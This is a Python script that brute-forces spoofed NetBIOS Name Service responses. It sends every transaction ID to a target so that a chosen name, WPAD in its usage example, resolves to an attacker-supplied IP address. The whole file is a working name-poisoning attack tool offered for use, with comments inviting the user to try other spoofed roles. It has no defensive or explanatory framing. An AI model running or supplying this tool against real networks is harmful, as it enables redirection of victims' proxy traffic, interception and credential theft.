import socket
import struct
import sys


def Main():
    # arg checking
    if len(sys.argv) != 4:
        print("%s <name> <dest_ip> <resp_ip>" % sys.argv[0])
        print("%s WPAD 10.10.10.1 10.10.10.10" % sys.argv[0])
        sys.exit(0)

    # Set our variables
    name = sys.argv[1]
    to_ip = sys.argv[2]
    return_ip = sys.argv[3]
    ipv6 = False

    sport=137
    dport=137
    sec = 255 # The TTL in seconds, simply change it here

    # You should only ever need Workstation/Redirector
    # But feel free to try the rest ;)
    role = {
        0:"\x41\x41\x00", # :"Workstation/Redirector" # normal
        1:"\x42\x4c\x00", # :"Domain Master Browser"
        2:"\x42\x4d\x00", # :"Domain Controller"
        3:"\x42\x4e\x00", # :"Local Master Browser"
        4:"\x42\x4f\x00", # :"Browser Election"
        5:"\x43\x41\x00", # :"File Server"
        6:"\x41\x42\x00"  # :"Browser"
    }

    # This is how we make the nbname... its a pain
    def make_nbname(name):
        spoof_name = name.upper()
        encoded_name = ''.join([chr((ord(c)>>4) + ord('A'))
            + chr((ord(c)&0xF) + ord('A')) for c in spoof_name])
        padding = "CA"*(15-len(spoof_name))
        return '\x20' + encoded_name + padding + role[0] # role here

    def make_packet(name, return_ip):
        pkt = '\x00\x00'   # better to do it on the fly than call the method over and over
        pkt += "\x85\x00"  # Flags = response + authoritative + recursion desired
        pkt +="\x00\x00"   # Questions = 0
        pkt +="\x00\x01"   # Answer RRs = 1
        pkt +="\x00\x00"   # Authority RRs = 0
        pkt +="\x00\x00"   # Additional RRs = 0
        pkt += make_nbname(name) # original query name
        pkt +="\x00\x20"   # Type = NB ...whatever that means
        pkt +="\x00\x01"   # Class = IN
        pkt += struct.pack('>I', sec) # \x00\x00\x00\xff = 4min 15sec
        pkt +="\x00\x06"   # Datalength = 6
        pkt +="\x00\x00"   # Flags B-node, unique
        pkt += socket.inet_aton(return_ip) # 32bit packed binary, ipv6 uses socket.inet_pton()
        return pkt

    # If we ever need it at some point
    if ipv6:
        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


    # How we set the source port.
    s.bind(('', sport))

    # Make the packet
    data = make_packet(name, return_ip)
    tid = 0
    count = 0

    while tid < 65535:
        if tid % 10000 == 0: 
            count += 10000
            print "%s Packets Sent" % count
        data = str(struct.pack('>H', tid)) + data[2:]
        s.sendto(data, (to_ip, dport))
        tid += 1
    tid = 0 # reset the tid


if __name__ == '__main__':
    Main()
